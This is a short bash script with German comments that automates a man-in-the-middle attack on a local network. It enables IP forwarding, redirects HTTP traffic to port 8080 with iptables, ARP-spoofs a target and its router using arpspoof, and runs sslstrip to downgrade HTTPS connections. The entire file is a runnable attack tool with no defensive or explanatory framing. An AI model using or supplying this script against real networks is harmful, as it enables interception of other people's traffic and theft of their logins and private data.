#!/bin/bash

#routing aktivieren
echo 1 > /proc/sys/net/ipv4/ip_forward

#Nat konfigurieren
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

echo "Router IP?"

read RouterIP

echo $RouterIP

echo "Target IP?"

read TargetIP

echo $TargetIP

#arpspoofing aktivieren
arpspoof -i eth0 -r -t $RouterIP $TargetIP &

#arpspoofing mit ssl strip kombinieren
sslstrip -l 8080
